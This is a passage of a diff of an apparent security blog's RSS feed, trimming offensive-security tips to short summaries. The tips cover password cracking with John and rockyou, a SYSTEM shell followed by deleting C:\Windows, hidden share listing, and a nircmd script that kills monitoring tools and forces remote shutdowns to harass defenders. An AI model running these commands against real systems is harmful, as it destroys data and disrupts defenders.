-&lt;p&gt;Both Hashcat and John deal with this by limiting the length where permutations occur. (HC/JTR peeps please correct me if I&amp;rsquo;m wrong). Cain on the other hand, will try every possibility and hang on the 3rd line for years (over exagerated). How do you solve that? Easy, remove any word over a certain length. While that does work, and very similar to what the HC/JTR do, I don&amp;rsquo;t like loosing words from my dictionary, so I tend to sort them by length. That way, all the nasty ones are near the end and I can scale back the rules on them.&lt;/p&gt;
-
-&lt;p&gt;To do that is very simple:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;awk &#39;{print length, $0}&#39; rockyou.txt | sort -n | cut -d &amp;quot; &amp;quot; -f2- &amp;gt; rockyou_ls.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thats it. Basic, simple and stored here for reference.&lt;/p&gt;
-</description>
+      <description>This is one of those stupid simple things that are easy to forget so I&amp;rsquo;m posting it here. Wordlists and dictionaries are awesome for cracking password hashes, and although, thanks to things like Mimikatz and WCE I don&amp;rsquo;t have to, but there is times where it&amp;rsquo;s important.
+Now, having John, Hashcat, or Cain go through a dictionary is a 1-for-1 hit, no time wasted no matter how it&amp;rsquo;s sorted and usually is best to sort them by most common first so you get earlier hits.</description>
     </item>
     
     <item>
@@ -403,24 +76,10 @@ dnscmd /ZonePrint domain.com.local
       <pubDate>Mon, 24 Dec 2012 06:55:17 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-12-24-delete-trustedinstaller-only-files-and-folders/</guid>
-      <description>&lt;p&gt;Not very security related, but something I don&amp;rsquo;t want to forget how to do. It was a PITA. So I had a old WINDOWS directory that I needed to get rid of. And the following commands gave me the ooomph needed to get the job done.&lt;/p&gt;
-
-&lt;p&gt;1) Get a SYSTEM shell so all modding of permissions will be good.&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;psexec /accepteula -i -s cmd&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;2) Grant Administrators FULL rights to the directory and all sub directories and files&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;icacls C:\Windows\* /grant Administrators:F /C /T&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;3) Finish the job, delete the folder and everything below it&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;rmdir /s /q C:\Windows\&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;All done. Weeeeeeeee!&lt;/p&gt;
-
-&lt;p&gt;If you have a better way to do this via commands or programs please let me know, always looking to learn more.&lt;/p&gt;
-</description>
+      <description>Not very security related, but something I don&amp;rsquo;t want to forget how to do. It was a PITA. So I had a old WINDOWS directory that I needed to get rid of. And the following commands gave me the ooomph needed to get the job done.
+1) Get a SYSTEM shell so all modding of permissions will be good.
+psexec /accepteula -i -s cmd
+2) Grant Administrators FULL rights to the directory and all sub directories and files</description>
     </item>
     
     <item>
@@ -429,27 +88,9 @@ dnscmd /ZonePrint domain.com.local
       <pubDate>Tue, 13 Nov 2012 08:44:47 +0000</pubDate>
       
       <guid>https://room362.com/post/2012/2012-11-13-smash-and-grab-windows-dir-lists/</guid>
-      <description>&lt;p&gt;Looking through network shares can be slow, and waiting for individual searches to finish looking through the whole &amp;ldquo;drive&amp;rdquo; is redundant. Easier to just use some Windows voodoo to get a good list to look through offline:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;start /b cmd /c dir /b /s \\nas\users_home_share$ ^&amp;gt; shareinfo.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Breaking that down:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;start /b&lt;/code&gt; - starts a process that won&amp;rsquo;t hang up our current one, with the &amp;ldquo;b&amp;rdquo; flag meaning &amp;ldquo;background&amp;rdquo;, yay not visible to the user! (unless your process forces it back)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;cmd /c&lt;/code&gt; - no reason to explain this one it runs something.. (since dir isn&amp;rsquo;t an executable but something that resides inside of cmd this is needed)&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;dir /b /s&lt;/code&gt; - the &amp;ldquo;s&amp;rdquo; means sub directories and pretty widely known. The one that isn&amp;rsquo;t as well known is the &amp;ldquo;b&amp;rdquo; which means &amp;ldquo;bare&amp;rdquo; format. Also known as &amp;ldquo;puts-path-on-every-line-to-make-it-easy-to-find-and-grep-stuff&amp;rdquo; mode.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The path is arbitrary, if you didn&amp;rsquo;t know you could dir list a UNC path, now ya do.&lt;/p&gt;
-
-&lt;p&gt;The &lt;code&gt;^&amp;gt;&lt;/code&gt; is the cool trick. If you use &amp;ldquo;start&amp;rdquo; to create a process in the background, re-routing its output to a file instead of just getting the fact that start began (the only thing start outputs), is made possible by this lowly &amp;lsquo;carrot&amp;rsquo; before the greater-than.&lt;/p&gt;
-
-&lt;p&gt;And that&amp;rsquo;s it. With big drives, come back in an hour or two and you&amp;rsquo;ll have a perfectly grep-able file waiting for you to grep through for file names and extensions to your heart&amp;rsquo;s content.&lt;/p&gt;
-
-&lt;p&gt;One caveat, don&amp;rsquo;t freak out if it&amp;rsquo;s been 30 minutes and the file size is still ZERO. It doesn&amp;rsquo;t write the output until the end, it write buffered in the process and then &amp;ldquo;start&amp;rdquo; pulls it back out at the end with the carrot.&lt;/p&gt;
-</description>
+      <description>Looking through network shares can be slow, and waiting for individual searches to finish looking through the whole &amp;ldquo;drive&amp;rdquo; is redundant. Easier to just use some Windows voodoo to get a good list to look through offline:
+start /b cmd /c dir /b /s \\nas\users_home_share$ ^&amp;gt; shareinfo.txt  Breaking that down:
+ start /b - starts a process that won&amp;rsquo;t hang up our current one, with the &amp;ldquo;b&amp;rdquo; flag meaning &amp;ldquo;background&amp;rdquo;, yay not visible to the user!</description>
     </item>
     
     <item>
@@ -458,15 +99,8 @@ dnscmd /ZonePrint domain.com.local
       <pubDate>Thu, 15 Sep 2011 18:10:33 +0000</pubDate>
       
       <guid>https://room362.com/post/2011/2011-09-15-disconnect-stalled-ssh-session/</guid>
-      <description>&lt;p&gt;This doesn&amp;rsquo;t really apply to Windows users as you can just close puTTy. But for everyone else, stalled SSH Sessions suck. You are either slamming enter to get it to realize it&amp;rsquo;s been disconnected or just waiting for it to. Well, for those of us who are impatient just hit:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;~.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thats right, SHIFT + the key above TAB, release, and hit the period. You may have to hit ENTER first to clear the buffer or whatever it does, but do that and it will disconnect the SSH session right away.&lt;/p&gt;
-
-&lt;p&gt;Stupid trick, but I use it all the time (especially on shotty MiFi connections).&lt;/p&gt;
-</description>
+      <description>This doesn&amp;rsquo;t really apply to Windows users as you can just close puTTy. But for everyone else, stalled SSH Sessions suck. You are either slamming enter to get it to realize it&amp;rsquo;s been disconnected or just waiting for it to. Well, for those of us who are impatient just hit:
+~.  Thats right, SHIFT + the key above TAB, release, and hit the period. You may have to hit ENTER first to clear the buffer or whatever it does, but do that and it will disconnect the SSH session right away.</description>
     </item>
     
     <item>
@@ -475,12 +109,9 @@ dnscmd /ZonePrint domain.com.local
       <pubDate>Mon, 12 Sep 2011 08:09:46 +0000</pubDate>
       
       <guid>https://room362.com/post/2011/2011-09-12-multiple-dictionaries-or-wordlists-using-john-the-ripper/</guid>
-      <description>&lt;p&gt;John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&amp;rsquo;s stdin function but I like to run rules against my lists and I didn&amp;rsquo;t see any how-tos on doing this. Here is my way:&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;ls dicts | xargs -t -I file ./john --pot=victim.pot --format=mscash --wordlist=dicts/file --rules victim_cachedump.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;This command will ls the &amp;lsquo;dicts&amp;rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I). Then it&amp;rsquo;s just your standard john arguments.&lt;/p&gt;
-</description>
+      <description>John the ripper only takes one word list at a time. There are plenty of docs out there that show you how to cat all of your dictionaries into John&amp;rsquo;s stdin function but I like to run rules against my lists and I didn&amp;rsquo;t see any how-tos on doing this. Here is my way:
+ls dicts | xargs -t -I file ./john --pot=victim.pot --format=mscash --wordlist=dicts/file --rules victim_cachedump.txt
+This command will ls the &amp;lsquo;dicts&amp;rsquo; directory, pipe it to xargs, which will spit out the command it uses for each itteration (-t) and replace every time it see the word file with the line/itteration its on (-I).</description>
     </item>
     
     <item>
@@ -489,31 +120,9 @@ dnscmd /ZonePrint domain.com.local
       <pubDate>Sat, 05 Mar 2011 19:52:27 +0000</pubDate>
       
       <guid>https://room362.com/post/2011/2011-03-05-psychological-warfare-with-nircmd/</guid>
-      <description>&lt;p&gt;One of the best ways to throw blue teamers off the scent of another host getting owned, which also has the added effect of stressing them out is a batch script that runs through some of the more annoying features in nircmd.exe in succession and at regular intervals:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www.nirsoft.net/utils/nircmd.html&#34;&gt;http://www.nirsoft.net/utils/nircmd.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;setdisplay 640x480&lt;/li&gt;
-&lt;li&gt;killprocess taskmgr.exe&lt;/li&gt;
-&lt;li&gt;killprocess procexp.exe&lt;/li&gt;
-&lt;li&gt;win -style title &amp;ldquo;my computer&amp;rdquo; 0x00c00000&lt;/li&gt;
-&lt;li&gt;win child title &amp;ldquo;my computer&amp;rdquo; +exstyle all 0x00400000&lt;/li&gt;
-&lt;li&gt;win +exstyle title &amp;ldquo;my computer&amp;rdquo; 0x00400000&lt;/li&gt;
-&lt;li&gt;win trans ititle &amp;ldquo;internet explorer&amp;rdquo; 256&lt;/li&gt;
-&lt;li&gt;win close class &amp;ldquo;CabinetWClass&amp;rdquo;&lt;/li&gt;
-&lt;li&gt;multiremote copy &amp;ldquo;c:tempcomputers.txt&amp;rdquo; exitwin poweroff force&lt;/li&gt;
-&lt;li&gt;exitwin logoff&lt;/li&gt;
-&lt;li&gt;standby&lt;/li&gt;
-&lt;li&gt;monitor off&lt;/li&gt;
-&lt;li&gt;win child class &amp;ldquo;Shell_TrayWnd&amp;rdquo; hide class &amp;ldquo;button&amp;rdquo;&lt;/li&gt;
-&lt;li&gt;win hide class progman&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Just to name a few&amp;hellip;&lt;/p&gt;
-
-&lt;p&gt;another fun batch script to have running is &amp;lsquo;echo knock knock | clip&amp;rsquo; in an endless and delayless loop. (I makes &amp;lsquo;knock knock&amp;rsquo; the only thing that will ever be pasted ;-)&lt;/p&gt;
-</description>
+      <description>One of the best ways to throw blue teamers off the scent of another host getting owned, which also has the added effect of stressing them out is a batch script that runs through some of the more annoying features in nircmd.exe in succession and at regular intervals:
+http://www.nirsoft.net/utils/nircmd.html
+ setdisplay 640x480 killprocess taskmgr.exe killprocess procexp.exe win -style title &amp;ldquo;my computer&amp;rdquo; 0x00c00000 win child title &amp;ldquo;my computer&amp;rdquo; +exstyle all 0x00400000 win +exstyle title &amp;ldquo;my computer&amp;rdquo; 0x00400000 win trans ititle &amp;ldquo;internet explorer&amp;rdquo; 256 win close class &amp;ldquo;CabinetWClass&amp;rdquo; multiremote copy &amp;ldquo;c:tempcomputers.</description>
     </item>
     
   </channel>
